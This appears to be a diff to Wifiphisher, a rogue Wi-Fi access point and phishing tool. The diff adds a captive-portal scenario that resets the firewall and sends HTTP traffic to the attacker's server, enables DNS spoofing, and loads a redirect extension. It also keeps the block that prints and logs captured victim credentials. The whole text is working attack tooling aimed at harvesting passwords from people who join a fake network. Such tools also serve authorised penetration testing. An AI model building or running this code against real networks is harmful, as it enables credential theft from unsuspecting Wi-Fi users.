@@ -342,10 +342,10 @@ class WifiphisherEngine:
             print("[" + G + "+" + W + "] Show your support!")
             print("[" + G + "+" + W + "] Follow us: https://twitter.com/wifiphisher")
             print("[" + G + "+" + W + "] Like us: https://www.facebook.com/Wifiphisher")
-        print("[" + G + "+" + W + "] Captured credentials:")
-        for cred in phishinghttp.creds:
-            logger.info("Credentials: %s", cred)
-            print(cred)
+            print("[" + G + "+" + W + "] Captured credentials:")
+            for cred in phishinghttp.creds:
+                logger.info("Credentials: %s", cred)
+                print(cred)
 
         # EM depends on Network Manager.
         # It has to shutdown first.
@@ -557,7 +557,12 @@ class WifiphisherEngine:
             self.fw.nat(ap_iface, args.internetinterface)
             set_ip_fwd()
         else:
-            self.fw.redirect_requests_localhost()
+            if args.phishingscenario == 'captive-portal':
+                # clear any old rules and only redirect HTTP to our server
+                self.fw.clear_rules()
+                self.fw.redirect_http_only()
+            else:
+                self.fw.redirect_requests_localhost()
         set_route_localnet()
 
         print('[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables')
@@ -682,6 +687,8 @@ class WifiphisherEngine:
             self.access_point.internet_interface = args.internetinterface
         print('[' + T + '*' + W + '] Starting the fake access point...')
 
+        # enable captive portal DNS spoofing if using captive-portal scenario
+        self.access_point.captive_portal_enabled = (args.phishingscenario == 'captive-portal')
         try:
             self.access_point.start(disable_karma=args.disable_karma)
             self.access_point.start_dhcp_dns()
@@ -723,6 +730,9 @@ class WifiphisherEngine:
                 extensions.append(KNOWN_BEACONS_EXTENSION)
             if not args.force_hostapd:
                 extensions.append(ROGUEHOSTAPDINFO)
+            # if the phishing scenario is captive-portal, load our captive portal redirect extension
+            if args.phishingscenario == 'captive-portal':
+                extensions.append('captiveportalredirect')
             self.em.set_extensions(extensions)
             self.em.init_extensions(shared_data)
             self.em.start_extensions()
